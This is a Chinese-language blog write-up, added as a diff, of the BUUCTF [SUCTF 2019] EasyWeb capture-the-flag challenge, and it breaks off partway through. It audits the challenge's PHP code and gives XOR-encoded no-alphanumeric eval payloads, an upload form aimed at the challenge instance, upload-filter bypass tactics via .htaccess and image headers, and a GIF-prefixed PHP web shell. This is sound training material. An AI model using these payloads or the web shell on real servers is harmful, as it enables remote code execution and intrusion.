@@ -1,0 +1,822 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="South">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[SUCTF 2019]EasyWeb参考：[SUCTF 2019]EasyWeb-CSDN博客 [BUUCTF题解][SUCTF 2019]EasyWeb - Article_kelp - 博客园 (cnblogs.com) 场景: 代码审计:12345678910111213141516171819202122232425262728293031323334353637383940414243">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF_[SUCTF 2019]EasyWeb">
+<meta property="og:url" content="http://example.com/2024/02/18/2024-02-18-[SUCTF%202019]EasyWeb/index.html">
+<meta property="og:site_name" content="South">
+<meta property="og:description" content="[SUCTF 2019]EasyWeb参考：[SUCTF 2019]EasyWeb-CSDN博客 [BUUCTF题解][SUCTF 2019]EasyWeb - Article_kelp - 博客园 (cnblogs.com) 场景: 代码审计:12345678910111213141516171819202122232425262728293031323334353637383940414243">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213133746094.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213151532252.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213152944988.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213220802182.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213222006414.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213222127585.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213225818685.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213225759507.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213225924525.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213230120518.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213230241660.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213230347611.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213230511448.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213230650369.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213231219940.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213231338423.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213231455476.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213232539210.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213232556360.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213233043246.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213233319227.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213233439097.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213234142911.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213234201910.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240213234252121.png">
+<meta property="article:published_time" content="2024-02-18T15:40:20.412Z">
+<meta property="article:modified_time" content="2024-02-18T16:14:09.097Z">
+<meta property="article:author" content="South">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/2024-2-18/image-20240213133746094.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>BUUCTF_[SUCTF 2019]EasyWeb - South</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"ThR4XZRMA2SwXDt3MeF5vjCN-gzGzoHsz","app_key":"PmUqfFPhyiQDRYmHOO0IXjTV","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>South</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="BUUCTF_[SUCTF 2019]EasyWeb"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-18 23:40" pubdate>
+          2024年2月18日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          56 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">BUUCTF_[SUCTF 2019]EasyWeb</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h1><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/111207725">SUCTF 2019]EasyWeb-CSDN博客</a></p>
+<p>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Article-kelp/p/16097100.html">BUUCTF题解][SUCTF 2019]EasyWeb - Article_kelp - 博客园 (cnblogs.com)</a></p>
+<h2 id="场景"><a href="#场景" class="headerlink" title="场景:"></a>场景:</h2><p><img src="/images/2024-2-18/image-20240213133746094.png" srcset="/img/loading.gif" lazyload alt="image-20240213133746094"></p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计:"></a>代码审计:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 文件上传函数，但是主函数没有执行</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span><br>    <span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$userdir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$userdir</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br>        <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>,<span class="hljs-variable">$extension</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$tmp_name</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-variable">$path</span>= <span class="hljs-variable">$userdir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$name</span>;<br>        @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$path</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 获取参数_的值，可以用非法传参.代替</span><br><span class="hljs-variable">$hhh</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$hhh</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-comment">// 判断传入的参数是否长度超过18</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hhh</span>)&gt;<span class="hljs-number">18</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);<br>&#125;<br><span class="hljs-comment">// 无数字字母rce</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);<br><span class="hljs-comment">// 返回字符串中所有字符出现的次数，以关联数组的形式</span><br><span class="hljs-variable">$character_type</span> = <span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);<br><span class="hljs-comment">// 统计关联数组有多少个字符类型，不能超过12种</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<br><span class="hljs-comment">// 危险函数执行</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$hhh</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>根据对主程序的代码审计，我们知道这里我们需要采用无数字字母rce的方式。</p>
+<h2 id="无数字字母rce的payload"><a href="#无数字字母rce的payload" class="headerlink" title="无数字字母rce的payload:"></a>无数字字母rce的payload:</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=phpinfo<br>或<br>?.=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=phpinfo<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240213151532252.png" srcset="/img/loading.gif" lazyload alt="image-20240213151532252"></p>
+<p>由于需要利用system(‘ls &#x2F;‘);以及echo <code>ls /</code>;这些代码都是需要进行拼接字符串才可以被eval()执行,如:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">$_GET[a]($_GET[b])=&gt;a=system&amp;b=&#x27;ls /&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>而这样做的结果就是加长了构造的payload字符串导致字符串的长度边长，所含字符的种类变多，从而被拦截</p>
+<p>但是题目中给出了获取flag的函数:get_the_flag,所以我们可以通过调用该函数获取flag</p>
+<h2 id="调用get-the-flag-函数"><a href="#调用get-the-flag-函数" class="headerlink" title="调用get_the_flag()函数:"></a>调用get_the_flag()函数:</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=get_the_flag<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240213152944988.png" srcset="/img/loading.gif" lazyload alt="image-20240213152944988"></p>
+<p>没有回显内容，这是因为我们只是调用了该函数，但是没有上传文件。</p>
+<h2 id="对get-the-flag-函数代码审计"><a href="#对get-the-flag-函数代码审计" class="headerlink" title="对get_the_flag()函数代码审计:"></a>对get_the_flag()函数代码审计:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 文件上传函数，但是主函数没有执行</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span><br>    <span class="hljs-comment">// 获取文件的保存路径，需要拼接上我们的ip地址的md5加密字符串</span><br>    <span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$userdir</span>))&#123;<br>        <span class="hljs-comment">// 创建文件地址</span><br>         <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$userdir</span>);<br>    &#125;<br>    <span class="hljs-comment">// 判断文件内容是否为空</span><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br>        <span class="hljs-comment">// 获取文件名信息</span><br>        <span class="hljs-comment">// 获取暂存文件夹中文件的路径名</span><br>        <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>        <span class="hljs-comment">// 获取文件名</span><br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-comment">// 获取文件的后缀名，获取最后一个.之后的字符串内容</span><br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// 判断上传的文件后缀名是否有ph</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>,<span class="hljs-variable">$extension</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>    <span class="hljs-comment">// 获取上传文件的内容，如果含有&lt;?则拦截</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$tmp_name</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <span class="hljs-comment">//判断文件是否为image类型，通过添加文件头幻术来绕过</span><br>    <span class="hljs-comment">// 上传文件到指定的路径</span><br>        <span class="hljs-variable">$path</span>= <span class="hljs-variable">$userdir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$name</span>;<br>        @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$path</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.根据代码审计我们知道我们需要上传文件到该网站中，才能成功运行，但是该网站没有提供给我们上传文件的接口，所以我们需要自己创造一个上传文件的接口，将我们本地文件的内容上传到该网站上<br>2.根据代码审计我们发现后缀过滤，但是这种过滤方式可以用.php.进行绕过，或者使用图片后缀名配合.htaccess文件进行绕过<br>3.exif_imagetype($tmp_name)检测文件内容是否为图片类型，使用添加文件幻术头进行绕过，.htaccess中#作为注释，所以可以采用XBM文件的，而上传的PHP代码文件可以添加更为方便的GIF文件的GIF89a66<br>4.mb_strpos(file_get_contents($tmp_name), &#x27;&lt;?&#x27;)对文件php内容的开头进行判断，可以使用&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;pass&#x27;]);&lt;/script&gt;进行绕过，不过前提是php运行内核版本&lt;7.0,或者使用加密内容传输，配合.htaccess文件解密加密的文件内容<br></code></pre></td></tr></table></figure>
+
+<h2 id="创造上传文件的html"><a href="#创造上传文件的html" class="headerlink" title="创造上传文件的html:"></a>创造上传文件的html:</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>文件上传<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>上传文件<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://4e0bb1d6-9792-4b57-9a11-3a50902dc814.node5.buuoj.cn:81/?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=get_the_flag&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;上传&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这里指定的url是指目标网站地址，上传的文件会被寄存在目标网站的tmp目录上等待被处理，这里同时在访问目标网址时启动get_the_flag()函数，用于上传文件后能直接处理tmp目录中的文件。</p>
+<h2 id="查看网页运行的php版本"><a href="#查看网页运行的php版本" class="headerlink" title="查看网页运行的php版本:"></a>查看网页运行的php版本:</h2><p><img src="/images/2024-2-18/image-20240213220802182.png" srcset="/img/loading.gif" lazyload alt="image-20240213220802182"></p>
+<p>php版本为7.2.19所以不能使用&lt;script language&#x3D;”php”&gt;@eval($_POST[‘pass’]);&lt;&#x2F;script&gt;进行绕过，所以要逃过对&lt;?的检测只能使用文件内容加密配合.htaccess文件加密文件内容，使用了.htaccess文件，就直接上传图片文件吧。</p>
+<h2 id="准备上传文件"><a href="#准备上传文件" class="headerlink" title="准备上传文件:"></a>准备上传文件:</h2><h3 id="pass-php"><a href="#pass-php" class="headerlink" title="pass.php:"></a>pass.php:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a66<br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;win!!!&quot;</span>;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure>
+
+<p>&#x3D;&gt;转化为绕过文件:</p>
